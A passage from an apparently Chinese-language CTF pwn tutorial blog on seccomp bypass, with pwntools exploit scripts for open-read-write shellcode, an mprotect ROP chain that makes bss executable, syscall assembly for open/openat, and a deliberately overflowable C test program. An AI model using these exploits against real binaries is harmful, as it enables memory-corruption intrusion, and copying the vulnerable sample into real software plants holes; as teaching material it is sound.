function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># *******************BUUCTF-Ubuntu16-libc-2.23********************* #</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span> <span class="comment"># ubuntu16</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># ***************************************************************** #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *******************BUUCTF-Ubuntu18-libc-2.27********************* #</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.27.so&quot; # ubuntu18</span></span><br><span class="line"><span class="comment">#one = [0x4f2be,0x4f2c5,0x4f322,0x10a38c]</span></span><br><span class="line"><span class="comment"># ***************************************************************** #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ***********GLibc-all-in-one-2.23********************************* #</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span></span><br><span class="line"><span class="comment">#one = [0x4527a , 0xf03a4 , 0xf1247]</span></span><br><span class="line"><span class="comment"># ***************************************************************** #</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;./orw&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,)</span></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26902)</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;!!!!&quot;</span>,asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure></div><ul><li>效果：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241114174216250.bmp"></p><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>在<code>seccomp学习(1)</code>中也介绍过了，运用其实和32位也没有区别，毕竟都是用<code>pwntools</code>自带的模块生成，也无需关心系统调用号。</p><h1 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul><li>它能够将一个文件或其他对象映射到内存中，使得该文件的内容可以像普通内存一样进行读取和写入操作，而不需要通过标准的 I&#x2F;O 函数（如 <code>read</code> 和 <code>write</code>）来进行文件操作。</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">mmap</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure></div><h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><ol><li>**<code>addr</code>**：<ul><li>请求的内存映射的起始地址。一般情况下，可以设置为 <code>NULL</code>，由操作系统选择合适的地址来映射。如果指定了一个地址，操作系统会尝试将映射放在该地址开始的位置。</li></ul></li><li>**<code>length</code>**：<ul><li>要映射的内存区域的长度（字节数）。必须是页面大小的倍数，页面大小通常是 4 KB 或 8 KB。</li></ul></li><li>**<code>prot</code>**：<ul><li>保护标志，指定映射区域的访问权限。常见的值包括：<ul><li><code>PROT_READ</code>：允许读取映射区域的内容。</li><li><code>PROT_WRITE</code>：允许写入映射区域的内容。</li><li><code>PROT_EXEC</code>：允许执行映射区域的代码。</li><li><code>PROT_NONE</code>：禁止访问该区域。</li></ul></li></ul></li><li>**<code>flags</code>**：<ul><li>映射区域的行为和特性标志。常见的值包括：<ul><li><code>MAP_SHARED</code>：映射区域对所有进程共享，修改会反映到文件或设备中。</li><li><code>MAP_PRIVATE</code>：映射区域为私有的，对进程内存的修改不会写回原文件。</li><li><code>MAP_ANONYMOUS</code>：映射一个匿名内存区域（不与任何文件关联）。</li><li><code>MAP_FIXED</code>：要求映射到指定的地址位置，可能会覆盖现有的地址空间。</li></ul></li></ul></li><li>**<code>fd</code>**：<ul><li>文件描述符，指向要映射的文件。如果映射的是匿名内存区域，则此参数应为 <code>-1</code>。</li></ul></li><li>**<code>offset</code>**：<ul><li>映射的起始偏移量（字节）。这个偏移量必须是页面大小的倍数，通常设置为 0。</li></ul></li></ol><h3 id="通常用法"><a href="#通常用法" class="headerlink" title="通常用法"></a>通常用法</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmap(start, len, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// 将这块区域设定为rxw</span></span><br></pre></td></tr></table></figure></div><p>之前的题目都是直接将shellcode写到栈上，或者写入一个bss段，然后函数会自动跳转去实现，但是如果开启了NX保护且只允许你往栈上写入数据，那你不炸了吗？<code>其实不然</code>，如何出题人贴心的给了你<code>mmap</code>，你可以往那里写入shellcode，然后控制程序执行流跳转过去执行，下面来看看：</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><mark><a href="http://downbeat.top/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad">[极客大挑战 2019]Not Bad</a><mark></mark></mark></p><h1 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><ul><li><code>mprotect</code> 是 <code>mmap</code> 的补充，它允许你改变一个已经映射到内存的区域的访问权限，比如使得某个内存区域只读、只写、可执行等。<code>mmap</code>开辟一段内存映射，<code>mprotect</code>修改某一段内存映射。</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure></div><h3 id="参数解析-1"><a href="#参数解析-1" class="headerlink" title="参数解析"></a>参数解析</h3><ol><li><p>**<code>addr</code>**：</p><ul><li>要修改保护属性的内存区域的起始地址。通常，地址应当是一个页面（通常是 4KB 或 8KB）的起始地址。如果 <code>addr</code> 不是页面对齐的，<code>mprotect</code> 会向下舍入到页面的起始位置。</li></ul></li><li><p>**<code>length</code>**：</p><ul><li>要修改保护属性的内存区域的长度（字节数）。长度通常应是页面大小的倍数。</li></ul></li><li><p>**<code>prot</code>**：</p><ul><li>新的保护属性。可以是以下标志的按位 OR 结果：<ul><li><code>PROT_READ</code>：该区域是可读的。</li><li><code>PROT_WRITE</code>：该区域是可写的。</li><li><code>PROT_EXEC</code>：该区域是可执行的。</li><li><code>PROT_NONE</code>：该区域不可访问。</li></ul></li></ul><p><code>prot</code> 组合了这些标志，用来指定访问权限。例如，<code>PROT_READ | PROT_WRITE</code> 表示该区域既可读又可写。</p></li></ol><h3 id="通常用法-1"><a href="#通常用法-1" class="headerlink" title="通常用法"></a>通常用法</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(addr, <span class="number">0x1000</span>, <span class="number">7</span>)</span><br></pre></td></tr></table></figure></div><h1 id><a href="#" class="headerlink" title></a></h1><h2 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h2><p>看我写的这篇文章：<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/140246412?spm=1001.2014.3001.5502">BUUCTF get_started_3dsctf_2016_buuctf get started-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g mprotect64.c -o mprotect64 -lseccomp -fno-stack-protector -no-pie</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rdi;&quot;</span>  </span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rsi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rdx;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret;&quot;</span>         </span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give you a gift %p\n&quot;</span>,&amp;<span class="built_in">puts</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/learn/Seccomp/test/mprotect_test$ checksec mprotect64</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/learn/Seccomp/test/mprotect_test/mprotect64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000</span><br></pre></td></tr></table></figure></div><ul><li>直接给了<code>puts的地址</code>,相当于已经知道了libc，即使开了NX保护，我们用<code>mprotect</code>修改某一部分的内存映射位rwx，然后将shellcode布置到那里，一样可以get flag。</li><li>通常先<code>mprotect</code>提权，再<code>read</code>直接读shellcode，然后跳转执行。</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>)<span class="comment">#,log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./mprotect64&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;gift &quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">mprotect = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rdi_rsi_rdx_ret = <span class="number">0x00000000004011fe</span></span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">bss = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line">lg(<span class="string">&quot;mprotect: &quot;</span>,mprotect)</span><br><span class="line">lg(<span class="string">&quot;read: &quot;</span>,read)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,bss,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,bss,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)</span><br><span class="line">payload += flat(pop_rdi_rsi_rdx_ret,bss,<span class="number">0x1000</span>,<span class="number">7</span>,ret,mprotect)</span><br><span class="line">payload += flat(pop_rdi_rsi_rdx_ret,<span class="number">0</span>,bss+<span class="number">0x100</span>,<span class="number">0x100</span>,ret,read)</span><br><span class="line">payload += p64(bss+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">sd(asm(shellcode))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure></div><ul><li>效果：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241114205628159.bmp"></p><h1 id="三种open的介绍"><a href="#三种open的介绍" class="headerlink" title="三种open的介绍"></a>三种open的介绍</h1><h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><ul><li>之前一直用的都是该函数，这里还是提一嘴吧</li></ul><h3 id="open-系统调用"><a href="#open-系统调用" class="headerlink" title="open 系统调用"></a><strong><code>open</code> 系统调用</strong></h3><p><code>open</code> 系统调用的 Linux x86_64 版本的系统调用号是 <code>2</code>。</p><blockquote><h4 id="系统调用参数："><a href="#系统调用参数：" class="headerlink" title="系统调用参数："></a>系统调用参数：</h4><ul><li><code>rax</code>：系统调用号（对于 <code>open</code>，值为 <code>2</code>）。</li><li><code>rdi</code>：文件路径 <code>pathname</code>（指向字符串的指针）。</li><li><code>rsi</code>：<code>flags</code>（例如 <code>O_RDONLY</code>, <code>O_WRONLY</code>）。</li><li><code>rdx</code>：<code>mode</code>（仅在文件创建时使用，例如 <code>0644</code>）。</li></ul></blockquote><h3 id="通常用法-2"><a href="#通常用法-2" class="headerlink" title="通常用法"></a>通常用法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push 0x67616c66;</span><br><span class="line">mov rdi, rsp;  // 注意不要pop, 不然后面不能直接mov rsi, rsp;</span><br><span class="line">xor rsi, rsi;</span><br><span class="line">xor rdx, rdx;</span><br><span class="line">push 2;</span><br><span class="line">pop rax;</span><br></pre></td></tr></table></figure></div><h2 id="openat1"><a href="#openat1" class="headerlink" title="openat1"></a>openat1</h2><ul><li><code>openat</code> 系列函数是对 <code>open</code> 系统调用的扩展，它允许在指定的目录文件描述符下进行文件操作。<code>openat</code> 的引入解决了 <code>open</code> 调用不能提供基于目录文件描述符的灵活性问题，特别是在需要相对路径时。</li><li>函数原型</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure></div><h3 id="openat-系统调用"><a href="#openat-系统调用" class="headerlink" title="openat 系统调用"></a><strong><code>openat</code> 系统调用</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openat` 系统调用的 Linux x86_64 版本的系统调用号是 `257</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="系统调用参数：-1"><a href="#系统调用参数：-1" class="headerlink" title="系统调用参数："></a>系统调用参数：</h4><ul><li><code>rax</code>：系统调用号（对于 <code>openat</code>，值为 <code>257</code>）。</li><li><code>rdi</code>：目录文件描述符 <code>dirfd</code>（例如 <code>AT_FDCWD</code>）。</li><li><code>rsi</code>：文件路径 <code>pathname</code>（指向字符串的指针）。</li><li><code>rdx</code>：<code>flags</code>（例如 <code>O_RDONLY</code>）。</li><li><code>r10</code>：<code>mode</code>（仅在创建文件时使用，默认为 <code>0</code>）。</li><li><code>r8</code>：路径解析标志（通常为 <code>0</code>）。</li></ul></blockquote><h3 id="通常用法-3"><a href="#通常用法-3" class="headerlink" title="通常用法"></a>通常用法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, -100              ; AT_FDCWD，-100表示当前目录，允许使用相对目录</span><br><span class="line">mov rsi, filename          ; 将文件路径 &#x27;flag&#x27; 地址传给 rsi</span><br><span class="line">mov rdx, 0                 ; O_RDONLY，表示只读模式</span><br><span class="line">mov r10, 0                 ; 模式位为 0，表示不创建文件</span><br><span class="line">mov r8, 0                  ; 路径解析标志为 0</span><br><span class="line">mov rax, 257               ; 系统调用号 257 (openat)</span><br></pre></td></tr></table></figure></div><ul><li><mark>注意:<mark>openat1打开文件之后会将<code>fd</code>给rax</mark></mark></li></ul><h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><p>1.这篇文章：<a href="http://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/">http://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/</a></p><p>2.自己编译：</p><ul><li>源码</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g openat1.c -o openat1 -fno-stack-protector -no-pie -z execstack -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span 